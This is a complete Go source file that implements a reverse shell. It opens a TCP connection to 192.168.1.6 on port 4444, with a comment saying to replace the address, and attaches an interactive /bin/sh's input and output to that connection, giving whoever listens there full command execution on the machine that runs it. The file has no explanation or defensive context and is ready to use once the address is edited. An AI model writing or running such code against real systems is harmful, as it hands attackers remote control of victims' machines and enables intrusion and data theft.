package main

import (
    "net"
    "os/exec"
)

func main() {
    conn, err := net.Dial("tcp", "192.168.1.6:4444") // Replace accordingly
    if err != nil {
        return
    }
    defer conn.Close()

    // Create a shell command
    cmd := exec.Command("/bin/sh", "-i")

    // Connect shell's stdin, stdout, stderr to the network connection
    cmd.Stdin = conn
    cmd.Stdout = conn
    cmd.Stderr = conn

    // Start the shell
    cmd.Run()
}
